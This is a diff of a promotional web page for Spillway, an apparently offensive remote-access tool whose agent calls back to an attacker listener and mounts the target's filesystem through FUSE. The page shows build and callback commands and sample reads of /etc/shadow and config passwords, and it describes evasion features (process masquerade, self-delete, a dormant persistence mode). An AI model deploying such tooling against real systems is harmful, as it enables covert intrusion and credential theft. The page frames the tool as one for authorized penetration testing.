-            <div class="section-label">// architecture</div>
-            <h2 class="section-title">Four layers, zero runtime config</h2>
-            <p class="section-desc">
-                Custom binary wire protocol, TLS 1.3 transport, multiplexed request/response, and FUSE integration.
-                All agent configuration baked at compile time via ldflags.
-            </p>
-
-            <div class="arch-grid">
-                <div class="arch-card">
-                    <div class="arch-num">01</div>
-                    <h3>Wire Protocol</h3>
-                    <p>Custom binary encoding: <code>[4B len][1B type][4B id][payload]</code>. Length-prefixed strings. 17 filesystem operations plus control messages. 16 MiB frame cap.</p>
-                </div>
-                <div class="arch-card">
-                    <div class="arch-num">02</div>
-                    <h3>Transport</h3>
-                    <p>TLS 1.3 with optional cert pinning. Mutual HMAC-SHA256 PSK auth. <code>FramedConn</code> with mutex-protected writes. HTTP CONNECT proxy tunneling.</p>
-                </div>
-                <div class="arch-card">
-                    <div class="arch-num">03</div>
-                    <h3>Agent</h3>
-                    <p>Path-jailed filesystem ops with symlink resolution. 64-goroutine worker pool via <code>ServerMux</code>. Token bucket rate limiter. Platform-specific opsec hardening.</p>
-                </div>
-                <div class="arch-card">
-                    <div class="arch-num">04</div>
-                    <h3>FUSE + Listener</h3>
-                    <p>Listener accepts connections, creates sessions with TTL cache. <code>ClientMux</code> multiplexes FUSE calls. <code>bazil.org/fuse</code> presents the remote filesystem locally.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- ── Getting Started ── -->
-        <section class="section" id="quickstart">
-            <div class="section-label">// getting started</div>
-            <h2 class="section-title">Operational in 60 seconds</h2>
-            <p class="section-desc">
-                Clone, build, deploy. Go 1.22+ is the only requirement. The build script handles PSK generation,
-                SNI selection, and cross-compilation automatically.
-            </p>
-
-            <div class="terminal-two-col">
-                <div class="terminal">
-                    <div class="terminal-bar">
-                        <span class="terminal-dot"></span>
-                        <span class="terminal-dot"></span>
-                        <span class="terminal-dot"></span>
-                        <span class="terminal-label">build-and-deploy.sh</span>
-                    </div>
-                    <div class="terminal-body">
-                        <pre><span class="c"># Clone and build</span>
-<span class="p">$</span> <span class="t">git clone https://github.com/Real-Fruit-Snacks/Spillway.git</span>
-<span class="p">$</span> <span class="t">cd Spillway</span>
-
-<span class="c"># Build agent for target</span>
-<span class="p">$</span> <span class="t">./build.sh reverse 10.10.14.5:443</span>
-<span class="v">[+] Built bin/spillway-agent-linux-amd64</span>
-
-<span class="c"># Build listener</span>
-<span class="p">$</span> <span class="t">make listener</span>
-
-<span class="c"># Start listener</span>
-<span class="p">$</span> <span class="t">./bin/spillway listen</span> <span class="f">--port</span> <span class="t">443</span> <span class="f">--mount</span> <span class="t">./target</span>
-<span class="v">[*] Listening on :443</span></pre>
-                    </div>
-                </div>
-
-                <div class="terminal">
-                    <div class="terminal-bar">
-                        <span class="terminal-dot"></span>
-                        <span class="terminal-dot"></span>
-                        <span class="terminal-dot"></span>
-                        <span class="terminal-label">browse-remote-fs.sh</span>
-                    </div>
-                    <div class="terminal-body">
-                        <pre><span class="c"># Agent connects, filesystem is mounted</span>
-<span class="v">[+] Agent connected from 10.129.2.47:51234</span>
-<span class="v">[+] Mounted at ./target</span>
-
-<span class="c"># Use standard tools</span>
-<span class="p">$</span> <span class="t">ls ./target/etc/</span>
-<span class="v">crontab  group  hostname  hosts  passwd  shadow  ssh/</span>
-
-<span class="p">$</span> <span class="t">cat ./target/etc/shadow</span>
-<span class="v">root:$6$rounds=65536$salt$hash...:19000:0:99999:7:::</span>
-
-<span class="p">$</span> <span class="t">grep -r "password" ./target/var/www/</span>
-<span class="v">./target/var/www/html/config.php:$db_password = "hunter2";</span></pre>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- ── Detection Awareness ── -->
-        <section class="section">
-            <div class="section-label">// detection awareness</div>
-            <h2 class="section-title">Know your footprint</h2>
-            <p class="section-desc">
-                Understand what Spillway hides and what remains observable. Plan your engagement accordingly.
-            </p>
-
-            <div class="detect-grid">
-                <div class="detect-card hidden">
-                    <h3>Hidden from</h3>
-                    <ul>
-                        <li><code>ps aux</code> — Process masquerade shows false name</li>
-                        <li><code>/proc/&lt;pid&gt;/cmdline</code> — Zero arguments, nothing to inspect</li>
-                        <li>Basic file inspection — Self-delete removes binary post-execution</li>
-                        <li>Passive traffic inspection — TLS 1.3 encrypts all operations</li>
-                        <li>Core dumps — Disabled via <code>prctl</code> on Linux</li>
-                    </ul>
-                </div>
-                <div class="detect-card visible">
-                    <h3>Visible to</h3>
-                    <ul>
-                        <li><code>strace</code> / <code>eBPF</code> — System call tracing reveals behavior</li>
-                        <li>Network monitoring — Connection patterns remain observable</li>
-                        <li>EDR/XDR — Behavioral analysis may detect anomalies</li>
-                        <li>SELinux / AppArmor — May flag FUSE or network activity</li>
-                        <li>Memory forensics — Keys and buffers recoverable from RAM</li>
-                    </ul>
-                </div>
-            </div>
-        </section>
-
-        <!-- ── Footer ── -->
-        <footer class="footer">
-            <div class="footer-grid">
-                <div class="footer-col">
-                    <h4>Documentation</h4>
-                    <a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/README.md">README</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/CHANGELOG.md">Changelog</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/CONTRIBUTING.md">Contributing</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/SECURITY.md">Security Policy</a>
-                </div>
-                <div class="footer-col">
-                    <h4>Resources</h4>
-                    <a href="https://github.com/Real-Fruit-Snacks/Spillway">GitHub Repository</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Spillway/issues">Report Issue</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/LICENSE">License (MIT)</a>
-                </div>
-                <div class="footer-col">
-                    <h4>Toolkit</h4>
-                    <a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Conduit">Conduit</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Undertow">Undertow</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Grotto">Grotto</a>
-                    <a href="https://github.com/Real-Fruit-Snacks/Depth">Depth</a>
-                </div>
-                <div class="footer-col">
-                    <h4>License</h4>
-                    <p>MIT License. For authorized security testing, CTF competitions, and educational purposes only.</p>
-                </div>
-            </div>
-
-            <div class="footer-bottom">
-                <p>Spillway — reverse/bind/dormant FUSE filesystem mount for penetration testing</p>
-                <p class="disclaimer">
-                    For authorized security testing, CTF competitions, and educational purposes only.
-                    Always obtain proper authorization before testing on systems you do not own.
-                </p>
-            </div>
-        </footer>
-
+        <div class="stats animate">
+            <div class="stat"><div class="stat-num" data-target="3">0</div><div class="stat-label">Modes</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-target="1" data-prefix="" data-suffix=".3">0</div><div class="stat-label">TLS Version</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-target="133">0</div><div class="stat-label">Tests</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-suffix="" data-target="0" data-prefix="PSK">0</div><div class="stat-label">Auth</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-suffix="" data-target="0" data-prefix="FUSE">0</div><div class="stat-label">Mount</div></div>
+        </div>
+        <div class="gradient-line"></div>
     </div>
+
+    <!-- Features Bento -->
+    <section id="features">
+        <div class="container">
+            <div class="section-label animate">FEATURES</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Three ways in, one mount out</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Reverse, bind, or dormant. Full FUSE mount. TLS 1.3 encryption. PSK authentication. Agent deployment with zero runtime args.</p>
+
+            <div class="bento">
+                <div class="bento-card bento-hero animate" style="transition-delay:.1s">
+                    <h3>Reverse / Bind / Dormant</h3>
+                    <p>Three connection modes. Agent calls back (reverse), listens on target (bind), or sits silent with no open ports until an authenticated UDP knock triggers a callback (dormant). All modes over TLS 1.3 with mutual PSK auth.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443<br><span class="t-b">[+] PSK generated: K7x2m...  Mode: reverse</span><br><span class="t-b">[+] Built bin/spillway-agent-linux-amd64</span></div>
+                </div>
+                <div class="bento-card bento-stat animate" style="transition-delay:.18s">
+                    <div class="big" style="color:var(--teal)">3</div>
+                    <div class="label">Connection Modes</div>
+                </div>
+                <div class="bento-card bento-hero animate" style="transition-delay:.2s">
+                    <h3 style="color:var(--teal)">Full FUSE Mount</h3>
+                    <p>Real mountpoint on your machine. <code>ls</code>, <code>cat</code>, <code>cp</code>, <code>grep</code>, <code>find</code>, <code>vim</code> — any tool that reads files works transparently against the remote filesystem. 17 operations mapped through FUSE.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> ls ./target/etc/<br><span class="t-p">crontab  group  hostname  hosts  passwd  shadow  ssh/</span><br><span class="t-g">$</span> grep -r "password" ./target/var/www/<br><span class="t-p">config.php:$db_password = "hunter2";</span></div>
+                </div>
+                <div class="bento-card bento-stat animate" style="transition-delay:.28s">
+                    <div class="big">1.3</div>
+                    <div class="label">TLS Version</div>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.36s">
+                    <h3 style="color:var(--mauve)">PSK Authentication</h3>
+                    <p>Two-round HMAC-SHA256 challenge-response. Both sides prove key possession before any filesystem operations begin. Empty PSKs rejected. Auto-generated at build time.</p>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.1s">
+                    <h3 style="color:var(--peach)">Agent Deployment</h3>
+                    <p>Zero runtime arguments — all config baked via <code>-ldflags</code>. Nothing in <code>/proc/cmdline</code>. Static binary, cross-compiled for linux/windows/darwin on amd64/arm64.</p>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.18s">
+                    <h3 style="color:var(--green)">Dormant Mode</h3>
+                    <p>Agent sits silent with no open ports, no listeners, zero network footprint. An authenticated UDP knock triggers a reverse callback. Ideal for persistence on hardened targets.</p>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.26s">
+                    <h3 style="color:var(--yellow)">File Operations</h3>
+                    <p>17 filesystem operations: stat, readdir, read, write, create, mkdir, remove, rename, chmod, truncate, xattr, chown, symlink, link, statfs. Full read-write or read-only mode.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Architecture -->
+    <section id="architecture">
+        <div class="container">
+            <div class="section-label animate">ARCHITECTURE</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Four-layer design</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Agent on target, listener on attacker, TLS 1.3 transport, FUSE integration. All config baked at compile time.</p>
+            <div class="arch-grid">
+                <div class="arch-card animate" style="transition-delay:.1s"><div class="arch-num">1</div><h3>Agent</h3><p>Target-side binary. 17 filesystem operation handlers with path jailing and symlink resolution. 64-goroutine worker pool via <code>ServerMux</code>. Process masquerade, core dump prevention, self-delete.</p></div>
+                <div class="arch-card animate" style="transition-delay:.2s"><div class="arch-num">2</div><h3>Listener</h3><p>Attacker-side binary. Accepts connections, creates sessions with TTL cache. <code>ClientMux</code> multiplexes FUSE calls over single TLS connection. FUSE mount presents remote filesystem locally.</p></div>
+                <div class="arch-card animate" style="transition-delay:.3s"><div class="arch-num">3</div><h3>Transport</h3><p>TLS 1.3 with ephemeral ECDSA certs and optional fingerprint pinning. Length-prefixed framing with 16 MiB cap. Mutual HMAC-SHA256 PSK authentication. HTTP CONNECT proxy support.</p></div>
+                <div class="arch-card animate" style="transition-delay:.4s"><div class="arch-num">4</div><h3>FUSE Layer</h3><p>Translates kernel FUSE calls to network requests. <code>bazil.org/fuse</code> integration. Directory and file nodes map to remote operations. TTL caching reduces round trips.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Detection -->
+    <section>
+        <div class="container">
+            <div class="section-label animate">DETECTION AWARENESS</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Know the boundaries</h2>
+            <div class="two-col" style="margin-top:32px">
+                <div class="detect-card detect-hidden animate" style="transition-delay:.1s">
+                    <h3>Hidden From</h3>
+                    <ul>
+                        <li><code>ps aux</code> — process masquerade shows false name</li>
+                        <li><code>/proc/cmdline</code> — zero arguments, nothing to inspect</li>
+                        <li>File inspection — self-delete removes binary post-execution</li>
+                        <li>Passive traffic — TLS 1.3 encrypts all filesystem operations</li>
+                        <li>Dormant mode — zero network footprint until authenticated knock</li>
+                    </ul>
+                </div>
+                <div class="detect-card detect-visible animate" style="transition-delay:.2s">
+                    <h3>Visible To</h3>
+                    <ul>
+                        <li><code>strace</code>, <code>eBPF</code> — syscall tracing reveals behavior</li>
+                        <li>Network monitoring — connection patterns remain observable</li>
+                        <li>EDR / XDR — behavioral analysis may detect anomalies</li>
+                        <li>FUSE mount in <code>/proc/mounts</code> — mount visible to kernel</li>
+                        <li>Memory forensics — keys and buffers recoverable from RAM</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-line"></div>
+            <div class="footer-grid">
+                <div><h4>Documentation</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Spillway#quick-start">Quick Start</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Spillway#features">Features</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Spillway#architecture">Architecture</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Spillway#security">Security</a></li></ul></div>
+                <div><h4>Resources</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Spillway/issues">Report Issue</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/CONTRIBUTING.md">Contributing</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/CHANGELOG.md">Changelog</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/SECURITY.md">Security Policy</a></li></ul></div>
+                <div><h4>Toolkit</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Conduit">Conduit</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a></li><li><a href="https://github.com/Real-Fruit-Snacks">View All</a></li></ul></div>
+                <div><h4>License</h4><p>MIT License<br>Copyright 2026<br>Real-Fruit-Snacks</p></div>
+            </div>
+            <div class="footer-bottom">Part of the Real-Fruit-Snacks security toolkit</div>
+        </div>
+    </footer>
+
+    <script>
+    // Scroll animations
+    const obs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){el.target.classList.add('visible');obs.unobserve(el.target)}})},{threshold:.1,rootMargin:'0px 0px -50px 0px'});
+    document.querySelectorAll('.animate,.animate-scale').forEach(el=>obs.observe(el));
+
+    // Counter animation
+    function countUp(el){const t=parseInt(el.dataset.target),s=el.dataset.suffix||'',p=el.dataset.prefix||'',d=1500,st=performance.now();if(p&&t===0){el.textContent=p;return}function u(n){const pr=Math.min((n-st)/d,1),e=1-Math.pow(1-pr,3);el.textContent=p+Math.floor(t*e)+s;if(pr<1)requestAnimationFrame(u)}requestAnimationFrame(u)}
+    const sobs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){countUp(el.target);sobs.unobserve(el.target)}})},{threshold:.5});
+    document.querySelectorAll('.stat-num').forEach(el=>sobs.observe(el));
+
+    // Nav scroll
+    window.addEventListener('scroll',()=>{document.querySelector('.nav').style.borderBottomColor=window.scrollY>20?'rgba(49,50,68,0.8)':'rgba(49,50,68,0.3)'});
+    </script>
 </body>
 </html>
